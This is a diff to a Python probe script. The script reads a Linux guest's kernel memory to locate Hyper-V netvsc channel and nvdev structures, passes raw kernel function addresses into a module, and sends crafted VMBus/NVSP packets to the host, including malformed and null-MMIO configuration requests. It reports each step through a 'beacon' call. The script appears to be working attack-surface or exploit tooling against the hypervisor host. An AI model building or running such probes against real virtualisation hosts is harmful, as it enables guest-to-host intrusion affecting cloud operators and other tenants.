@@ -106,6 +106,20 @@ def netvsc_primary_relid():
     raise RuntimeError("netvsc primary channel not found")
 
 
+def netvsc_nvdev(kcore, channel):
+    callback = symbol_address("netvsc_channel_cb")
+    channel_data = kcore.read(channel, 4096)
+    hits = [offset for offset in range(0, len(channel_data) - 8, 8)
+            if struct.unpack_from("<Q", channel_data, offset)[0] == callback]
+    if len(hits) != 1:
+        raise RuntimeError("netvsc callback hits=%r" % hits)
+    context = struct.unpack_from("<Q", channel_data, hits[0] + 8)[0]
+    context_channel, nvdev = struct.unpack("<QQ", kcore.read(context, 16))
+    if context_channel != channel:
+        raise RuntimeError("netvsc context mismatch")
+    return nvdev
+
+
 def write_param(name, value):
     open(PARAMS + name, "w").write(str(value) + "\n")
 
@@ -171,8 +185,11 @@ def main():
         relid, device_dir = netvsc_primary_relid()
         kcore = KCore()
         channel = channel_for_relid(kcore, relid)
+        nvdev = netvsc_nvdev(kcore, channel)
+        nvsp_version = struct.unpack("<I", kcore.read(nvdev, 4))[0]
         result.update({"relid": relid, "channel": hex(channel), "device": os.path.basename(device_dir)})
-        beacon({"status": "channel_resolved", **result})
+        result.update({"nvdev": hex(nvdev), "nvsp_version": hex(nvsp_version)})
+        beacon({**result, "status": "channel_resolved"})
 
         send_fn = symbol_address("vmbus_sendpacket")
         recv_fn = symbol_address("vmbus_recvpacket")
@@ -189,12 +206,17 @@ def main():
             })
             beacon(result)
             return
+        beacon({**result, "status": "module_loaded"})
         write_param("channel", hex(channel))
         write_param("send_fn", hex(send_fn))
         write_param("recv_fn", hex(recv_fn))
         write_param("wait_ms", 1500)
 
         ops = []
+        # Positive control: ordinary NVSP1 receive-buffer request. Its error
+        # response proves this probe owns and drains the live inbound ring.
+        ops.append(run_op(90, {}, "nvsp_recvbuf_invalid_control"))
+        beacon({"status": "progress", "ops": ops[-1:]})
         # S1: CONFIG with a null MMIO region (pure capability probe).
         ops.append(run_op(1, {"pa": 0, "len": 4096, "sub": 1}, "config_null"))
         beacon({"status": "progress", "ops": ops[-1:]})
